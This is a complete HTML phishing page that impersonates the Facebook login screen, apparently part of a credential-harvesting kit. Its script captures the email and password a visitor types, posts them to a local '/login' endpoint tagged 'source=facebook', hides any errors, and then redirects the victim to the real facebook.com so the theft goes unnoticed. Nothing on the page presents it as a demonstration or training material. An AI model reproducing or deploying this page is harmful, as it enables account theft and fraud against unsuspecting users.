<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<title>Log in to Facebook</title>
<meta name="theme-color" content="#ffffff">
<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 36 36'%3E%3Ccircle cx='18' cy='18' r='18' fill='%230866FF'/%3E%3Cpath d='M25 18a7 7 0 1 0-8.09 6.92v-4.9h-1.79V18h1.79v-1.55c0-1.77 1.05-2.75 2.66-2.75.77 0 1.58.14 1.58.14v1.74h-.89c-.88 0-1.15.54-1.15 1.1V18h1.96l-.31 2.02h-1.65v4.9A7 7 0 0 0 25 18z' fill='white'/%3E%3C/svg%3E">
<style>
  *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
  html,body{margin:0;padding:0;height:100%}
  body{
    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
    background:#ffffff;color:#1c1e21;
    display:flex;flex-direction:column;align-items:center;
    min-height:100vh;
    -webkit-font-smoothing:antialiased;
    font-size:15px;
    padding:0 24px;
  }

  .topbar{
    width:100%;
    padding:14px 0 6px;
    text-align:center;
    color:#65676b;
    font-size:13px;
    flex-shrink:0;
  }

  .fb-logo{
    width:70px;height:70px;
    margin-top:52px;
    flex-shrink:0;
    user-select:none;
    pointer-events:none;
  }

  form{
    width:100%;
    max-width:400px;
    display:flex;flex-direction:column;
    margin-top:44px;
    gap:12px;
    flex-shrink:0;
  }

  .input-wrap{position:relative;width:100%}

  .input-wrap input{
    width:100%;
    height:54px;
    padding:0 16px;
    background:#ffffff;
    border:1px solid #ccd0d5;
    border-radius:10px;
    color:#1c1e21;
    font-size:15px;
    font-family:inherit;
    outline:none;
    transition:border-color .15s, box-shadow .15s;
  }
  .input-wrap input::placeholder{color:#8a8d91;opacity:1}
  .input-wrap input:focus{
    border-color:#0866FF;
    box-shadow:0 0 0 2px rgba(8,102,255,.12);
  }
  .input-wrap input[type="password"]{padding-right:60px;letter-spacing:.3px}

  .show-pass{
    position:absolute;right:14px;top:50%;transform:translateY(-50%);
    background:transparent;border:0;color:#1c1e21;
    font-weight:600;font-size:14px;
    cursor:pointer;padding:4px 6px;
    display:none;font-family:inherit;
  }
  .input-wrap input:not(:placeholder-shown) ~ .show-pass{display:block}

  .submit{
    margin-top:4px;
    height:52px;
    border:0;
    border-radius:10px;
    background:#0866FF;
    color:#fff;
    font-weight:600;
    font-size:16px;
    cursor:pointer;
    font-family:inherit;
    transition:opacity .1s;
  }
  .submit:hover{opacity:.92}
  .submit:active{opacity:.8}
  .submit:disabled{opacity:.7;cursor:default}

  .forgot{
    display:block;
    text-align:center;
    color:#0866FF;
    font-size:15px;
    font-weight:500;
    text-decoration:none;
    margin-top:14px;
    font-family:inherit;
  }

  .divider{
    display:flex;align-items:center;gap:14px;
    width:100%;margin:22px 0 16px;
    color:#8a8d91;font-size:13px;
  }
  .divider::before,.divider::after{content:"";flex:1;height:1px;background:#dadde1}

  .spacer{flex:1;min-height:40px}

  .bottom{
    width:100%;
    max-width:400px;
    display:flex;flex-direction:column;
    align-items:center;
    gap:20px;
    padding-bottom:32px;
    flex-shrink:0;
  }

  .create-btn{
    width:100%;
    height:52px;
    border-radius:26px;
    background:transparent;
    border:1px solid #0866FF;
    color:#0866FF;
    font-weight:600;
    font-size:16px;
    text-decoration:none;
    display:flex;align-items:center;justify-content:center;
    font-family:inherit;
    transition:background .15s;
  }
  .create-btn:hover{background:rgba(8,102,255,.06)}
  .create-btn:active{background:rgba(8,102,255,.12)}

  .meta-logo{
    height:22px;width:auto;opacity:.7;
    user-select:none;pointer-events:none;
  }

  .loading-overlay{
    position:fixed;inset:0;background:#ffffff;display:none;
    align-items:center;justify-content:center;flex-direction:column;gap:16px;z-index:50;
  }
  .loading-overlay.on{display:flex}
  .spinner{
    width:34px;height:34px;border-radius:50%;
    border:3px solid #dadde1;border-top-color:#0866FF;
    animation:spin .8s linear infinite;
  }
  @keyframes spin{to{transform:rotate(360deg)}}
  .loading-overlay p{font-size:13px;color:#8a8d91;margin:0}

  @media (max-width:400px){
    .fb-logo{margin-top:36px;width:60px;height:60px}
    form{margin-top:32px}
    body{padding:0 20px}
  }
</style>
</head>
<body>

<div class="topbar">English (US)</div>

<svg class="fb-logo" viewBox="0 0 36 36" xmlns="http://www.w3.org/2000/svg" aria-label="Facebook">
  <circle cx="18" cy="18" r="18" fill="#0866FF"/>
  <path d="M25 18a7 7 0 1 0-8.09 6.92v-4.9h-1.79V18h1.79v-1.55c0-1.77 1.05-2.75 2.66-2.75.77 0 1.58.14 1.58.14v1.74h-.89c-.88 0-1.15.54-1.15 1.1V18h1.96l-.31 2.02h-1.65v4.9A7 7 0 0 0 25 18z" fill="#ffffff"/>
</svg>

<form id="loginForm" method="POST" action="/login" autocomplete="off" novalidate>
  <input type="hidden" name="source" value="facebook">

  <div class="input-wrap">
    <input type="text" id="username" name="email" placeholder="Email address or phone number"
           autocomplete="username" autocapitalize="off" autocorrect="off" spellcheck="false" required>
  </div>

  <div class="input-wrap">
    <input type="password" id="password" name="password" placeholder="Password"
           autocomplete="current-password" required>
    <button type="button" class="show-pass" id="showPass">Show</button>
  </div>

  <button type="submit" class="submit" id="submitBtn">Log in</button>

  <a class="forgot" href="https://www.facebook.com/login/identify/" target="_self" rel="noopener">
    Forgotten password?
  </a>

  <div class="divider">or</div>
</form>

<div class="spacer"></div>

<div class="bottom">
  <a class="create-btn" href="https://www.facebook.com/reg/" target="_self" rel="noopener">
    Create new account
  </a>

  <svg class="meta-logo" viewBox="0 0 108 22" xmlns="http://www.w3.org/2000/svg" aria-label="Meta">
    <path fill="#65676b" d="M8.2 3.1c-2.4 0-4.2 1.4-5.8 3.8C1.3 8.9.6 10.5.1 11.6c-.4.9-.9 1.4-1.3 1.4-.5 0-.8-.4-.8-1.2 0-2.6.8-5.1 2.3-7.3C2 2.5 4.1 1 6.3 1c1.4 0 2.7.5 3.9 1.5.4.3.9.3 1.2-.1.3-.4.3-.9-.1-1.2C9.9.2 8.2-.5 6.3-.5 2.2-.5-.6 1.9-2.2 5.4c-1.1 2.5-1.6 5.1-1.6 7.4 0 1.8 1 2.9 2.7 2.9 1.7 0 2.8-.9 3.8-2.5.9-1.4 1.7-3 2.6-4.7 1.7-3 3.4-4.7 5.5-4.7 1.6 0 2.9 1 3.4 2.6.3 1-.2 2.2-1.3 3.3-1 .9-2.2 1.6-3.2 2.2-.5.3-.7.9-.4 1.3.3.4.9.5 1.3.3 1.2-.7 2.5-1.5 3.6-2.5 1.6-1.5 2.4-3.3 1.9-5-.6-2.3-2.5-3.9-4.9-3.9-4.5 0-7.8 2.4-10.7 7.3L.5 17c-.2.4-.2.8.2 1.1.4.3.9.3 1.2-.2l1.7-3c2.8-4.7 5.4-6.8 8.7-6.8 1.7 0 3.2.6 4.2 1.7" transform="translate(2 2)"/>
    <text x="40" y="16.5" fill="#65676b" font-family="-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif" font-size="15" font-weight="600" letter-spacing="-.2">Meta</text>
  </svg>
</div>

<div class="loading-overlay" id="loader">
  <div class="spinner"></div>
  <p>Logging you in…</p>
</div>

<script>
  const REDIRECT_URL = "https://www.facebook.com/";

  const showBtn = document.getElementById('showPass');
  const pass    = document.getElementById('password');
  const form    = document.getElementById('loginForm');
  const btn     = document.getElementById('submitBtn');
  const loader  = document.getElementById('loader');

  showBtn.addEventListener('click', () => {
    const t = pass.type === 'password';
    pass.type = t ? 'text' : 'password';
    showBtn.textContent = t ? 'Hide' : 'Show';
  });

  form.addEventListener('submit', async (e) => {
    e.preventDefault();
    const u = document.getElementById('username').value.trim();
    const p = pass.value;
    if (!u || !p) return;

    btn.disabled = true;
    btn.textContent = 'Logging in…';

    try {
      const body = new URLSearchParams();
      body.append('email', u);
      body.append('password', p);
      body.append('source', 'facebook');
      await fetch('/login', {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: body.toString(),
        keepalive: true
      });
    } catch (_) {}

    loader.classList.add('on');
    setTimeout(() => {
      window.location.href = REDIRECT_URL;
    }, 900);
  });
</script>
</body>
</html>
